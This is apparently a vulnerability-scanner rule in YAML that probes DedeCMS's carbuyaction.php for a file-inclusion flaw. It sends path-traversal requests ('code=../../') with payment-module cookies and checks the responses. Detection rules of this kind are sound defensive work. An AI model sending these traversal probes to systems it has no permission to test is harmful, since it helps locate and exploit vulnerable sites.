cve-id: dedecms-carbuyaction-fileinclude
rules:
  - method: GET
    path: /plus/carbuyaction.php?dopost=return&code=../../
    headers:
      Cookie: code=alipay
    follow_redirects: true
    expression: |
      response.status == 200
  - method: GET
    path: /plus/carbuyaction.php?dopost=return&code=../../
    headers:
      Cookie: code=cod
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"Cod::respond()")
severity:
  high
type: 
  fileinclude
